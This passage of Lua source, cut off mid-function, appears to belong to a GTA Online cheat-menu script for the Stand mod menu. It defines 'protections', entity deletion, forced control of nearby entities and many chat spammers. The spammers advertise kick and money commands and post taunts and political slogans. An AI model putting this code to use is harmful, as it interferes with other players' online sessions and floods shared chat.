menu.toggle(protex, "Playerbar", {"custombar"}, "(BETA)", function(on_toggle)
    if on_toggle then
        playerbar = true
    else
        playerbar = false
    end
end)

local popularity_loop_command_ref = menu.ref_by_path("Online>Quick Progress>Set Nightclub Popularity", 38)

menu.toggle_loop(protex, "Popularity Loop", {"popularityloop"}, "Toggles the Nightclub popularity loop to always keep it at 100% every second.",function()
    menu.trigger_command(popularity_loop_command_ref, 100)
    util.yield(1000)
end)

local anti_mugger = menu.list(protex, "Block Muggers")

menu.toggle_loop(anti_mugger, "Anti-Mugger", {}, "Prevents you from being mugged", function() -- thx nowiry for improving my method :D
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if (memory.read_int(sender) ~= player and memory.read_int(target) == player 
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId))) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("Blocked mugger from " .. players.get_name(memory.read_int(sender)))
            end
        end)
    end
end)

menu.toggle_loop(anti_mugger, "Someone Else", {}, "Prevents others from being mugged.", function()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if memory.read_int(target) ~= player and memory.read_int(sender) ~= player
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId)) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("Block mugger sent by " .. players.get_name(memory.read_int(sender)) .. " to " .. players.get_name(memory.read_int(target)))
            end
        end)
    end
end)

protexx = menu.list(protex, "Clear All --notifications", {}, "", function(); end)

menu.action(protexx, "Clear All --notifications", {"clearnotifs"}, "Clears stand notifs and above mini map", function()
        menu.trigger_commands("clear--notifications")
        menu.trigger_commands("clearstandnotifys")
end)



menu.toggle_loop(protexx, "Clear All --notifications Toggled", {"toggleclearnotifs"}, "Clears stand notifs and above mini map", function(on_toggle)
    if on then
        menu.trigger_commands("clear--notifications")
        menu.trigger_commands("clearstandnotifys")
        util.yield(1000)
    else
        menu.trigger_commands("clear--notifications")
        menu.trigger_commands("clearstandnotifys")
    end
end)

menu.toggle_loop(protexx, "Clear All Transaction Errors", {"toggleclearallnotifs"}, "Clears stand notifs and above mini map & Transaction Errors.", function(on_toggle)
    local TransactionError = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Block")
    local TransactionErrorV = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>--notification")
    if on_toggle then
        menu.trigger_command(TransactionError, "on")
        menu.trigger_command(TransactionErrorV, "on")
        for i = 1, 100 do
            menu.trigger_commands("removeloader")
        end
        util.toast("It's not my fault the log error if prompted, wait for Stand to fix it")
    end
end)

menu.toggle_loop(protexx, "Clear All --notifications & Transaction Errors", {"toggleclearallnotifs"}, "Clears stand notifs and above mini map & Transaction Errors.", function(on_toggle)
    local clearnotifts = menu.ref_by_path("Game > Remove --notifications Above Minimap")
    local clearstandnotifs = menu.ref_by_path("Stand > Clear --notifications")
    local TransactionError = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Block")
    local TransactionErrorV = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>--notification")
    if on_toggle then
        menu.trigger_commands("clearnotifts")
        menu.trigger_commands("clearstandnotifs")
        menu.trigger_command(TransactionError, "on")
        menu.trigger_command(TransactionErrorV, "on")
        for i = 1, 100 do
            menu.trigger_commands("removeloader")
        end
        util.toast("It's not my fault the log error if prompted, wait for Stand to fix it")
    end
end)


	menu.action(protex, "Force Stop all sound events", {"stopsounds"}, "", function()
		for i=-1,100 do
			AUDIO.STOP_SOUND(i)
			AUDIO.RELEASE_SOUND_ID(i)
		end
	end)

    menu.toggle_loop(protex, "Engine Always On", {"alwayson"}, "", function()
        if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
            VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
            VEHICLE.SET_VEHICLE_LIGHTS(vehicle, 0)
            VEHICLE.SET_VEHICLE_HEADLIGHT_SHADOWS(vehicle, 2)
        end
    end)

	menu.action(protex, "Remove Attachments", {"remove attachments"}, "Cleans your ped of all attachments by regenerating it", function()
		--notification("Removing Attachments", colors.red)
		if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
			menu.trigger_commands("mpmale")
		else
			menu.trigger_commands("mpfemale")
		end
	
	end)

	menu.click_slider(protex,"Clear Shit Up", {"superc"}, "5 = peds, 4 = vehicles, 3 = objects, 2 = pickups, 1 = all \nNote: This excludes players and their vehicles.", 1, 5, 1, 1, function(on_change)
		if on_change == 5 then
			local count = 0
			for k,ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
		end
		if on_change == 4 then
			local count = 0
			for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
				local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
				if not PED.IS_PED_A_PLAYER(PedInSeat) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
			return
		end
		if on_change == 3 then
			local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			return
		end
		if on_change == 2 then
			local count = 0
			for k, ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			return
		end
		if on_change == 1 then
			local count = 0
			for k, ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end

			for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
				local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
				if not PED.IS_PED_A_PLAYER(PedInSeat) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end

			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
		


			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			return
		end
	end)

	menu.action(protex, "Super Clean Shit", {"clean"}, "Attempt to fuck every single entity without exception. Not recommended but fuck it", function(on_click)
		local ct = 0
		for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
			entities.delete_by_handle(ent)

			ct = ct + 1
		end
		util.toast("Pooped all vehicles!")
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not PED.IS_PED_A_PLAYER(ent) then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)

			end
			ct = ct + 1
		end
		util.toast("Shagged all peds AUUUUUGGH!!!")
		for k,ent in pairs(entities.get_all_objects_as_handles()) do
			if ent ~= PLAYER.PLAYER_PED_ID() then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				ct = ct + 1
			end
		end
		util.toast("Gobbled all pickups nom nom!")
		util.toast("Fucked Everything off " .. ct .. " Entities removed. :)")
		--notification("Shit cleaned nom nom > " .. ct .. "Entities", colors.green)
			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				util.yield()
			return
		end
	end)

menu.toggle_loop(protex, "Anti-Beast", {}, "Prevents you from being turned into the beast but will also stop the event for others.", function()
    if util.spoof_script("am_hunt_the_beast", SCRIPT.TERMINATE_THIS_THREAD) then
        util.toast("Hunt the beast script detected. Terminating script...")
    end
end)

menu.toggle_loop(protex, "Block Transaction Error 'Test'", {}, "Likely to lead to errors, use under responsibility", function(on_toggle)
    local TransactionError = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Block")
    local TransactionErrorV = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>--notification")
    if on_toggle then
        menu.trigger_command(TransactionError, "on")
        menu.trigger_command(TransactionErrorV, "on")
        for i = 1, 100 do
            menu.trigger_commands("removeloader")
        end
        util.toast("It's not my fault the log error, wait for Stand to fix it")
    end
end)

----
YOINK_PEDS = false
YOINK_VEHICLES = false
YOINK_OBJECTS = false
YOINK_PICKUPS = false

YOINK_RANGE = 500

Yoinkshit = false

local getEntityCoords = ENTITY.GET_ENTITY_COORDS
local getPlayerPed = PLAYER.GET_PLAYER_PED

menu.toggle(protex, "Force Request Control", {"controlall"}, "", function (yoink)
    if yoink then
        Yoinkshit = true
        util.create_thread(function()
            while Yoinkshit do
                local yoinksq = YOINK_RANGE^2
                local localCoord = getEntityCoords(getPlayerPed(players.user()))
                local BigTable = {}
                if YOINK_PEDS then
                    local pedTable = entities.get_all_peds_as_pointers()
                    for i = 1, #pedTable do
                        local coord = entities.get_position(pedTable[i])
                        local distsq = SYSTEM.VDIST2(coord.x, coord.y, coord.z, localCoord.x, localCoord.y, localCoord.z)
                        local handle = entities.pointer_to_handle(pedTable[i])
                        if not PED.IS_PED_A_PLAYER(handle) then
                            if distsq <= yoinksq then
                                BigTable[#BigTable+1] = handle
                            end
                        end
                    end
                end
                wait()
                if YOINK_VEHICLES then
                    local vehTable = entities.get_all_vehicles_as_pointers()
                    for i = 1, #vehTable do
                        local coord = entities.get_position(vehTable[i])
                        local distsq = SYSTEM.VDIST2(coord.x, coord.y, coord.z, localCoord.x, localCoord.y, localCoord.z)
                        if distsq <= yoinksq then
                            BigTable[#BigTable+1] = entities.pointer_to_handle(vehTable[i])
                        end
                    end
                end
                wait()
                if YOINK_OBJECTS then
                    local objTable = entities.get_all_objects_as_pointers()
                    for i = 1, #objTable do
                        local coord = entities.get_position(objTable[i])
                        local distsq = SYSTEM.VDIST2(coord.x, coord.y, coord.z, localCoord.x, localCoord.y, localCoord.z)
                        if distsq <= yoinksq then
                            BigTable[#BigTable+1] = entities.pointer_to_handle(objTable[i])
                        end
                    end
                end
                if YOINK_PICKUPS then
                    local pickTable = entities.get_all_pickups_as_pointers()
                    for i = 1, #pickTable do
                        local coord = entities.get_position(pickTable[i])
                        local distsq = SYSTEM.VDIST2(coord.x, coord.y, coord.z, localCoord.x, localCoord.y, localCoord.z)
                        if distsq <= yoinksq then
                            BigTable[#BigTable+1] = entities.pointer_to_handle(pickTable[i])
                        end
                    end
                end
                for i = 1, #BigTable do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(BigTable[i])
                    wait()
                end
                util.toast("Requested control of all")
                ----
                wait()
            end
            util.stop_thread()
        end)
    else
        Yoinkshit = false
    end
end)
local yoinkSettings = menu.list(protex, "Force Request Control Settings", {}, "")
menu.slider(yoinkSettings, "Range For Request Control", {"controlrange"}, "", 1, 5000, 5000, 10, function (value)
    YOINK_RANGE = value
end)
menu.toggle(yoinkSettings, "Peds", {}, "", function (peds)
    YOINK_PEDS = peds
end)
menu.toggle(yoinkSettings, "Vehicles", {}, "", function (vehs)
    YOINK_VEHICLES = vehs
end)
menu.toggle(yoinkSettings, "Objects", {}, "", function (objs)
    YOINK_OBJECTS = objs
end)
menu.toggle(yoinkSettings, "Pickups", {}, "", function (pick)
    YOINK_PICKUPS = pick
end)

	menu.toggle_loop(protex, "No Entity Spawn", {"noentities"}, "De spawns all entites.", function(on_loop)
		local ct = 0
		for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
			entities.delete_by_handle(ent)

			ct = ct + 1
		end
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not PED.IS_PED_A_PLAYER(ent) then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)

			end
			ct = ct + 1
		end
		for k,ent in pairs(entities.get_all_objects_as_handles()) do
			if ent ~= PLAYER.PLAYER_PED_ID() then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				ct = ct + 1
			end
		end
			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				util.yield()
			return
		end
	end)

	menu.divider(protex, "Addict Protections")

	
	menu.toggle(protex, "Toggle Block all Network Events", {}, "This breaks the game, so only leave it on if you are worried about an incoming modder attack", function(on_toggle)
		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockNetEvents)
			--notification("Toggling block all network events on... Get those cunts!", colors.red)
		else
			menu.trigger_command(UnblockNetEvents)
			--notification("Toggling block all network events off...", colors.red)
		end
	end)


	menu.toggle(protex, "Toggle Block all Incoming Syncs", {}, "This breaks the game, so only leave it on if you are worried about an incoming modder attack", function(on_toggle)
		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>SyPanicncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockIncSyncs)
			--notification("Toggling block all incoming syncs on... Get those cunts!", colors.red)
		else
			menu.trigger_command(UnblockIncSyncs)
			--notification("toggling block all incoming syncs off...", colors.red)
		end
	end)

	menu.toggle(protex, "Toggle Block all Outgoing Syncs", {}, "This breaks the game, and other players will not receive any updates from your client", function(on_toggle)
		if on_toggle then
			--notification("Toggling block all outgoing syncs on", colors.red)
			menu.trigger_commands("desyncall on")
		else
			--notification("Toggling block all outgoing syncs off", colors.red)
			menu.trigger_commands("desyncall off")
		end
	end)

	menu.toggle(protex, "Toggle Anticrashcam", {"acc"}, "Put this here for redundancy", function(on_toggle)
		if on_toggle then
			--notification("Toggling anticrashcam... Get those cunts", colors.red)
			menu.trigger_commands("anticrashcam on")
			menu.trigger_commands("potatomode on")
		else
			--notification("Toggling anticrashcam off...", colors.red)
			menu.trigger_commands("anticrashcam off")
			menu.trigger_commands("potatomode off")
		end
	end)

	menu.toggle(protex, "Toggle Panic Mode", {"panic"}, "Uses all of the above. This will render you basically uncrashable at the cost of disrupting all gameplay", function(on_toggle)
		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			--notification("Toggling panic mode on... Get those cunts", colors.red)
			menu.trigger_commands("desyncall on")
			menu.trigger_command(BlockIncSyncs)
			menu.trigger_command(BlockNetEvents)
			menu.trigger_commands("anticrashcamera on")
		else
			--notification("toggling panic mode off...", colors.red)
			menu.trigger_commands("desyncall off")
			menu.trigger_command(UnblockIncSyncs)
			menu.trigger_command(UnblockNetEvents)
			menu.trigger_commands("anticrashcamera off")
		end
	end)

	spams = menu.list(menu.my_root(), "Chat Spammers", {}, "", function(); end)
	menu.divider(spams, "Chat Spammers")

	helpcommands = menu.list(spams, "Help Commands", {}, "Command: helpcommands", function(); end)

menu.action(helpcommands, "Help Commands", {"helpcommands"}, "", function()
    chat.send_message(
        "/help1 /help2 /help3 /help4 /help5 /carhelpa /carhelpb /carhelpc /whatmenu",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(helpcommands, "Help Commands", {"helpcommand"}, "", function(on_toggle)
    chat.send_message(
        "/help1 /help2 /help3 /help4 /help5 /carhelpa /carhelpb /carhelpc /whatmenu",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

menu.toggle_loop(helpcommands, "Type Help Commands", {"typehelpcommand"}, "", function(on_toggle)
    chat.send_message(
        "Type /helpcommands for help",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	carhelpa = menu.list(spams, "Gift Car A", {}, "Command: carhelpa", function(); end)

menu.action(carhelpa, "Gift Car A", {"carhelpa"}, "", function()
    chat.send_message(
        "Fill a garage with LOW END/FREE cars in a 2 car garage order 2 free or cars steal them!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(carhelpa, "Gift Car A", {"carhelpa"}, "", function(on_toggle)
    chat.send_message(
        "Fill a garage with LOW END/FREE cars in a 2 car garage order 2 free or cars steal them!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	carhelpb = menu.list(spams, "Gift Car B", {}, "Command: carhelpb", function(); end)

menu.action(carhelpb, "Gift Car B", {"carhelpb"}, "", function()
    chat.send_message(
        "Put away all your personal vehicles! Type: /spawn NAME then go to garage and type /gift YOURNAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(carhelpb, "Gift Car B", {"carhelpb"}, "", function(on_toggle)
    chat.send_message(
        "Put away all your personal vehicles! Type: /spawn NAME then go to garage and type /gift YOURNAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	carhelpc = menu.list(spams, "Gift Car C", {}, "Command: carhelpc", function(); end)

menu.action(carhelpc, "Gift Car C", {"carhelpc"}, "", function()
    chat.send_message(
        "Repete first steps to do it again",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(carhelpc, "Gift Car C", {"carhelpc"}, "", function(on_toggle)
    chat.send_message(
        "Repete first steps to do it again",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	help1 = menu.list(spams, "Commands A", {}, "Command: help1", function(); end)

menu.action(help1, "Commands A", {"help1"}, "", function()
    chat.send_message(
        "/max NAME /ceopay NAME /givecollectibles NAME /rp NAME /crazyloop NAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(help1, "Commands A", {}, "", function(on_toggle)
    chat.send_message(
        "/max NAME /ceopay NAME /givecollectibles NAME /rp NAME /crazyloop NAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	help2 = menu.list(spams, "Commands B", {}, "Command: help2", function(); end)

menu.action(help2, "Commands B", {"help2"}, "", function()
    chat.send_message(
        "/boost NAME /Addictboost NAME /resetacc NAME /repair NAME /invon NAME /invoff NAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(help2, "Commands B", {}, "", function(on_toggle)
    chat.send_message(
        "/boost NAME /Addictboost NAME /resetacc NAME /repair NAME /invon NAME /invoff NAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	help3 = menu.list(spams, "Commands C", {}, "Command: help3", function(); end)

menu.action(help3, "Commands C", {"help3"}, "", function()
    chat.send_message(
        "/arm NAME /ammo NAME /autoheal NAME /bail NAME /giveotr NAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(help3, "Commands C", {}, "", function(on_toggle)
    chat.send_message(
        "/arm NAME /ammo NAME /autoheal NAME /bail NAME /giveotr NAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	help4 = menu.list(spams, "Commands D", {}, "Command: help4", function(); end)

menu.action(help4, "Commands D", {"help4"}, "", function()
    chat.send_message(
        "/blast NAME /boop NAME /desynckick NAME /storymode NAME /kickv1 NAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(help4, "Commands D", {}, "", function(on_toggle)
    chat.send_message(
        "/blast NAME /boop NAME /desynckick NAME /storymode NAME /kickv1 NAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	help5 = menu.list(spams, "Commands E", {}, "Command: help5", function(); end)

menu.action(help5, "Commands E", {"help5"}, "", function()
    chat.send_message(
        "/gotowaypoint NAME /alltowaypoint NAME /fixme NAME /yoinkpickups NAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(help5, "Commands E", {}, "", function(on_toggle)
    chat.send_message(
        "/gotowaypoint NAME /alltowaypoint NAME /fixme NAME /yoinkpickups NAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)


	casinohelp1 = menu.list(spams, "Roulette Method", {}, "Command: casinohelp1", function(); end)

menu.action(casinohelp1, "Roulette Method", {"casinohelp1"}, "", function()
    chat.send_message(
        "If you want to make money come to casino play roulette and bet max on 1st 12(50k) and Red 1(5k), win 3 loose 1 550k a minute",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(casinohelp1, "Roulette Method", {"togglecasinohelp1"}, "", function(on_toggle)
    chat.send_message(
        "If you want to make money come to casino play roulette and bet max on 1st 12(50k) and Red 1(5k), win 3 loose 1 550k a minute",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	casinohelp2 = menu.list(spams, "Blackjack Method", {}, "Command: casinohelp2", function(); end)

menu.action(casinohelp2, "Blackjack Method", {"casinohelp2"}, "", function()
    chat.send_message(
        "If you want to make money come to casino play blackjack! Click max bet then hit stand and win 2x your bet!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(casinohelp2, "Blackjack Method", {"togglecasinohelp2"}, "", function(on_toggle)
    chat.send_message(
        "If you want to make money come to casino play blackjack! Click max bet then hit stand and win 2x your bet!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	whatmenu = menu.list(spams, "What Menu Do I Use?", {}, "Command: whatmenu", function(); end)

menu.action(whatmenu, "What Menu Do I Use?", {"whatmenu"}, "", function()
    chat.send_message(
        "I use Stand Ultimate, 2take1 VIP coloaded, and I got tons other menu's.",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(whatmenu, "What Menu Do I Use?", {"whatmenu"}, "", function(on_toggle)
    chat.send_message(
        "I use Stand Ultimate, 2take1 VIP coloaded, and I got tons other menu's.",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	imfuckinggod = menu.list(spams, "I'm Fucking God", {}, "Command: imfuckinggod", function(); end)

menu.action(imfuckinggod, "I'm Fucking God", {"imfuckinggod"}, "", function()
    chat.send_message(
        "I'M FUCKING GOD!!!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(imfuckinggod, "I'm Fucking God", {"imfuckinggod"}, "", function(on_toggle)
    chat.send_message(
        "I'M FUCKING GOD!!!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end)

	reportme = menu.list(spams, "Report Me", {}, "Command: reportme", function(); end)

menu.action(reportme, "Report Me", {"reportme"}, "", function()
    chat.send_message(
        "REPORT ME!!!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(reportme, "Report Me", {"reportme"}, "", function(on_toggle)
    chat.send_message(
        "REPORT ME!!!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end)


	ilovezelensky = menu.list(spams, "I <3 ZELEN", {}, "Command: ilovezelensky", function(); end)

menu.action(ilovezelensky, "I <3 ZELEN", {"ilovezelensky"}, "Russians hate this ;)", function()
    chat.send_message(
        "I <3 PRESIDENT VOLODYMYR ZELENSKYY",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(ilovezelensky, "I <3 ZELEN", {"ilovezelensky"}, "Russians hate this ;)", function(on_toggle)
    chat.send_message(
        "I <3 PRESIDENT VOLODYMYR ZELENSKYY",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end)

	iloveputin = menu.list(spams, "I <3 PUTIN", {}, "Command: iloveputin", function(); end)

menu.action(iloveputin, "I <3 PUTIN", {"iloveputin"}, "Ukranians hate this ;)", function()
    chat.send_message(
        "I <3 PRESIDENT VOLODYMYR PUTIN",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(iloveputin, "I <3 PUTIN", {"iloveputin"}, "Ukranians hate this ;)", function(on_toggle)
    chat.send_message(
        "I <3 PRESIDENT VOLODYMYR PUTIN",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end)

	yuminwoman = menu.list(spams, "Yumin Woman", {}, "Command: yuminwoman", function(); end)

menu.action(yuminwoman, "Yumin Woman", {"yuminwoman"}, "AUUUUUUUUUGGHH", function()
    chat.send_message(
        "Yumin woman! AUUUUUUUUUGGHH!!!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(yuminwoman, "Yumin Woman", {"yuminwoman"}, "AUUUUUUUUUGGHH", function(on_toggle)
    chat.send_message(
        "Yumin woman! AUUUUUUUUUGGHH!!!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end)
----------------------Fun Shit-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


------------------------------------
--Nuke
------------------------------------

function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = toDirection(CAM.GET_GAMEPLAY_CAM_ROT(0))
    local destination =
    {
        x = cam_pos.x + direction.x * distance,
        y = cam_pos.y + direction.y * distance,
        z = cam_pos.z + direction.z * distance
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x,
            cam_pos.y,
            cam_pos.z,
            destination.x,
            destination.y,
            destination.z,
            flag,
            -1,
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    return {p1, p2, p3, p4}
end

function direction()
    local c1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 5, 0)
    local res = raycast_gameplay_cam(-1, 1000)
    local c2

    if res[1] != 0 then
        c2 = res[2]
    else
        c2 = get_offset_from_gameplay_camera(1000)
    end

    c2.x = (c2.x - c1.x) * 1000
    c2.y = (c2.y - c1.y) * 1000
    c2.z = (c2.z - c1.z) * 1000
    return c2, c1
end

local remove_projectiles = false
local function disableProjectileLoop(projectile)
    util.create_thread(function()
        util.create_tick_handler(function()
